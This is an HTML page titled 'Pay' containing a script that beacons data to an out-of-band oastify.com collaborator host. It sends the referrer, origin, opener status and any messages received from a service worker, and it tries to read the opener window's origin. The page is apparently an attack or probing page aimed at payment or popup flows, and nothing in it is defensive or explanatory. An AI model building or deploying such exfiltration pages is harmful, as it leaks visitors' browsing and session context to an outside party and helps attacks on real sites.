  <!DOCTYPE html>
  <html>
  <head><title>Pay</title></head>
  <body>
  <script>
  const OOB = 'https://ua8bgofxi61ugvubb5h68nigu70yopce.oastify.com';
  const log = d => new Image().src = OOB + '/handler?' + new URLSearchParams(
    typeof d === 'string' ? {m: d} : d
  ).toString();

  log({
    loaded: 1,
    ref: document.referrer,
    opener: window.opener ? 'yes' : 'no',
    origin: location.origin
  });

  // Receive data from SW
  navigator.serviceWorker.addEventListener('message', e => {
    log({src: 'sw_msg', d: JSON.stringify(e.data)});
  });

  // If opened as a popup, try to read opener
  if (window.opener) {
    try {
      log({opener_origin: window.opener.location.origin});
    } catch(e) {
      log({opener_origin: 'cross-origin: ' + e.message});
    }
  }
  </script>
  </body>
  </html>
